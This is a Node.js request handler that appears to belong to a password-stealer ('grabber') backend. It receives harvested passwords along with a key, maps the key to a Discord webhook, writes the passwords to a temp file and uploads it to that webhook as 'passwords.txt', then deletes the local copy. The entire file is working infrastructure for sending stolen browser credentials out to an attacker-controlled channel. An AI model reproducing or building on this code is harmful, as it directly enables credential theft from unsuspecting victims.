const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { WebhookClient } = require('discord.js');

module.exports = async (req, res) => {
    const { key, passwords } = req.body
    if (!key) return;
    let webhook = await keyToWebhook(key)
    if (!webhook) return;
    let content = !passwords.includes('URL:') ? "Passwords don\'t found." : passwords;
    fs.writeFileSync(`./Src/Temp/mdp_${key}.txt`, content);
    const webhookClient = new WebhookClient({ url: webhook });
    await webhookClient.send({
        files: [{
            attachment: `./Src/Temp/mdp_${key}.txt`,
            name: "passwords.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/mdp_${key}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}